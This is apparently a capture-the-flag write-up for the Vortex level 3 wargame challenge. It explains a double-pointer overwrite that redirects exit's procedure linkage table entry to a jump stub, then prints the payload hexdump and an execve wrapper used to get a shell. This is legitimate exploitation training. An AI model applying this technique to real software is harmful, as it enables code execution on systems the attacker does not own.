@@ -1,0 +1,112 @@
+General idea for this level is that you can overwrite a double pointer, which is then dereferenced twice. It writes
+the address of buf (argv[1], essentially) to the double dereferenced location.
+
+
+                                          vortex3.c
+ ┌──────────────────────────────────────────────────────────────────────────────────────────────┐
+ │                                                                                              │
+ │ /*                                                                                           │
+ │  * 0xbadc0ded.org Challenge #02 (2003-07-08)                                                 │
+ │  *                                                                                           │
+ │  * Joel Eriksson <je@0xbadc0ded.org>                                                         │
+ │  */                                                                                          │
+ │                                                                                              │
+ │ #include <string.h>                                                                          │
+ │ #include <stdlib.h>                                                                          │
+ │ #include <stdio.h>                                                                           │
+ │                                                                                              │
+ │ unsigned long val = 31337;                                                                   │
+ │ unsigned long *lp = &val;                                                                    │
+ │                                                                                              │
+ │ int main(int argc, char **argv)                                                              │
+ │ {                                                                                            │
+ │         unsigned long **lpp = &lp, *tmp;                                                     │
+ │         char buf[128];                                                                       │
+ │                                                                                              │
+ │         if (argc != 2)                                                                       │
+ │                 exit(1);                                                                     │
+ │                                                                                              │
+ │         strcpy(buf, argv[1]);                                                                │
+ │                                                                                              │
+ │         if (((unsigned long) lpp & 0xffff0000) != 0x08040000)                                │
+ │                 exit(2);                                                                     │
+ │                                                                                              │
+ │         tmp = *lpp;                                                                          │
+ │         **lpp = (unsigned long) &buf;                                                        │
+ │         // *lpp = tmp; // Fix suggested by Michael Weissbacher @mweissbacher 2013-06-30      │
+ │                                                                                              │
+ │         exit(0);                                                                             │
+ │ }                                                                                            │
+ │                                                                                              │
+ └──────────────────────────────────────────────────────────────────────────────────────────────┘
+
+The only stipulation about this -- the initial value we overwrite lpp with is checked against 0x08040000. If it doesn't start
+with the address 0x08040000, then the dereference (2x) into a write never happens.
+
+After the double-dereferenced location is checked, it attempts to assign it to the address of buf.
+
+Since there are no returns, only exits, this means our goal will be to overwrite the location of exit
+in the procedure linkage table.
+
+The double pointer makes this a little tricky... normally we'd want to overwrite the address 0x08049734 (for my glibc version),
+however we can't just provide that as lpp directly, since it'll try to dereference twice.
+
+That means we need to find that address in the binary.
+Fortunatley for us, its loaded in directly in the binary as an instruction (in order to access the got) AND
+the address for that instruction is in the range checked by the if statement (0x0804....).
+
+That just means we provide this ┐ instructions address to overwrite lpp (plus an offset to get the address specifically) and we can make exit point to buf!
+                                │
+ ┌ 6: sym.imp.exit ();          v
+ └      ╎╎   0x08048310      ff2534970408   jmp dword [reloc.exit]      ; 0x8049734
+        ╎╎   0x08048316      6810000000     push 0x10                   ; 16
+        └──< 0x0804831b      e9c0ffffff     jmp sym..plt
+
+132 trash bytes and an extra 4 at the end overwrite lpp.
+
+Once overwritten though, we only have trash data in buf, so now we need to either put shellcode in buf directly, or provide
+instructions inside of buf that make it jump to shellcode (I chose the latter).
+
+Similarly to how I did it in maze2, I introduced instructions to set eax, and then jmp to eax.
+
+│ \xb8\xAD\xDR\xES\xS. (eax = address)
+│ and
+│ \xff\xe0 (jmp eax)
+
+
+
+                        hexdump of argv bytes (for shell)
+ ┌──────────────────────────────────────────────────────────────────────────┐
+                 ┌eax=shellcode, shellcode loc, jmp eax bytes
+                 v
+   b8 c6 df ff  ff ff e0 42  42 42 42 42  42 42 42 42  │....│...B│BBBB│BBBB│
+   42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
+   42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
+   42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
+   42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
+   42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
+   42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
+   42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
+   42 42 42 42  12 83 04 08                            │BBBB│....│    │    │
+                    ^ location of code that contains plt address for exit
+
+ └──────────────────────────────────────────────────────────────────────────┘
+
+
+ Using these bytes, I constructed a wrapper file that works locally and on the server!
+
+                                localwrapper.c (shortened)
+┌───────────────────────────────────────────────────────────────────────────────────────┐
+│ #define _GNU_SOURCE                                                                   │
+│ #include <string.h>                                                                   │
+│ #include <unistd.h>                                                                   │
+│                                                                                       │
+│ int main(void) {                                                                      │
+│ 	char *environment[2] = {"SHELLCODE=....", 0};                                       │
+│ 	char *argv[3] = {"./vortex3", "\xb8\xc6\xdf\xff\xff\xff\xe0\x42""BBB...BBB", 0};    │
+│ 	execve("./vortex3", argv, environment);                                             │
+│ }                                                                                     │
+└───────────────────────────────────────────────────────────────────────────────────────┘
+
+
+Compiling and running htis on the server (with .vortex replaced with /vortex) will net a shell!
